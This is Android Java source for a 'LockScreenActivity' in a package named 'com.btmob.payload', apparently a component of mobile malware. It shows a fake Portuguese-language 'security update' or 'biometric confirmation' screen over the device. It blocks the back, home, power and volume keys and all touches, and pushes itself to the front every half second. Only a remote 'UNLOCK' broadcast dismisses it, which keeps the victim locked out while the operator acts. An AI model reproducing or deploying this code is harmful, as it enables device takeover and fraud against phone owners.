package com.btmob.payload;

import android.app.Activity;
import android.app.KeyguardManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.ProgressBar;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;

public class LockScreenActivity extends Activity {
    private BroadcastReceiver unlockReceiver;
    private Handler handler;
    private Runnable keepAlive;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
        );

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true);
            setTurnScreenOn(true);
            KeyguardManager km = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
            if (km != null) {
                km.requestDismissKeyguard(this, null);
            }
        }

        String lockType = getIntent().getStringExtra("lock_type");
        if ("biometric".equals(lockType)) {
            showBiometricLock();
        } else {
            showUpdateLock();
        }

        unlockReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if ("com.btmob.payload.UNLOCK".equals(intent.getAction())) {
                    finishAndRemoveTask();
                }
            }
        };
        registerReceiver(unlockReceiver, new IntentFilter("com.btmob.payload.UNLOCK"));

        handler = new Handler(Looper.getMainLooper());
        keepAlive = () -> {
            bringToFront();
            handler.postDelayed(keepAlive, 500);
        };
        handler.post(keepAlive);
    }

    private void showUpdateLock() {
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.BLACK);
        layout.setGravity(android.view.Gravity.CENTER);
        layout.setPadding(40, 40, 40, 40);

        ImageView icon = new ImageView(this);
        icon.setImageResource(android.R.drawable.ic_popup_sync);
        icon.setColorFilter(Color.WHITE);
        LinearLayout.LayoutParams iconParams = new LinearLayout.LayoutParams(120, 120);
        iconParams.setMargins(0, 0, 0, 30);
        icon.setLayoutParams(iconParams);
        layout.addView(icon);

        TextView title = new TextView(this);
        title.setText("Seu celular está atualizado");
        title.setTextColor(Color.WHITE);
        title.setTextSize(22);
        title.setGravity(android.view.Gravity.CENTER);
        layout.addView(title);

        TextView subtitle = new TextView(this);
        subtitle.setText("Android 14 • Atualização de segurança");
        subtitle.setTextColor(Color.GRAY);
        subtitle.setTextSize(14);
        subtitle.setGravity(android.view.Gravity.CENTER);
        subtitle.setPadding(0, 10, 0, 30);
        layout.addView(subtitle);

        ProgressBar progress = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progress.setIndeterminate(true);
        LinearLayout.LayoutParams progressParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 8);
        progressParams.setMargins(60, 0, 60, 0);
        progress.setLayoutParams(progressParams);
        layout.addView(progress);

        TextView bottom = new TextView(this);
        bottom.setText("Não desligue o dispositivo");
        bottom.setTextColor(Color.DKGRAY);
        bottom.setTextSize(12);
        bottom.setGravity(android.view.Gravity.CENTER);
        bottom.setPadding(0, 30, 0, 0);
        layout.addView(bottom);

        setContentView(layout);
    }

    private void showBiometricLock() {
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.BLACK);
        layout.setGravity(android.view.Gravity.CENTER);
        layout.setPadding(40, 40, 40, 40);

        ImageView icon = new ImageView(this);
        icon.setImageResource(android.R.drawable.ic_lock_idle_lock);
        icon.setColorFilter(Color.WHITE);
        LinearLayout.LayoutParams iconParams = new LinearLayout.LayoutParams(100, 100);
        iconParams.setMargins(0, 0, 0, 40);
        icon.setLayoutParams(iconParams);
        layout.addView(icon);

        TextView title = new TextView(this);
        title.setText("Confirme com sua biometria");
        title.setTextColor(Color.WHITE);
        title.setTextSize(20);
        title.setGravity(android.view.Gravity.CENTER);
        layout.addView(title);

        TextView subtitle = new TextView(this);
        subtitle.setText("Toque no sensor para continuar");
        subtitle.setTextColor(Color.GRAY);
        subtitle.setTextSize(14);
        subtitle.setGravity(android.view.Gravity.CENTER);
        subtitle.setPadding(0, 15, 0, 40);
        layout.addView(subtitle);

        View fingerprintArea = new View(this);
        GradientDrawable circle = new GradientDrawable();
        circle.setShape(GradientDrawable.OVAL);
        circle.setColor(Color.parseColor("#1a1a2e"));
        circle.setStroke(3, Color.parseColor("#333333"));
        fingerprintArea.setBackground(circle);
        LinearLayout.LayoutParams fpParams = new LinearLayout.LayoutParams(150, 150);
        fpParams.gravity = android.view.Gravity.CENTER;
        fingerprintArea.setLayoutParams(fpParams);
        layout.addView(fingerprintArea);

        TextView hint = new TextView(this);
        hint.setText("Biometria facial ou digital");
        hint.setTextColor(Color.DKGRAY);
        hint.setTextSize(12);
        hint.setGravity(android.view.Gravity.CENTER);
        hint.setPadding(0, 30, 0, 0);
        layout.addView(hint);

        setContentView(layout);
    }

    @Override
    protected void onResume() {
        super.onResume();
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) {
            hideSystemUI();
        }
    }

    private void hideSystemUI() {
        View decorView = getWindow().getDecorView();
        decorView.setSystemUiVisibility(
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY |
            View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
            View.SYSTEM_UI_FLAG_FULLSCREEN |
            View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
            View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
        );
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK ||
            keyCode == KeyEvent.KEYCODE_HOME ||
            keyCode == KeyEvent.KEYCODE_APP_SWITCH ||
            keyCode == KeyEvent.KEYCODE_VOLUME_UP ||
            keyCode == KeyEvent.KEYCODE_VOLUME_DOWN ||
            keyCode == KeyEvent.KEYCODE_POWER) {
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public boolean dispatchTouchEvent(MotionEvent ev) {
        return true;
    }

    @Override
    protected void onDestroy() {
        if (unlockReceiver != null) {
            unregisterReceiver(unlockReceiver);
        }
        if (handler != null && keepAlive != null) {
            handler.removeCallbacks(keepAlive);
        }
        super.onDestroy();
    }

    @Override
    public void onBackPressed() {
    }
}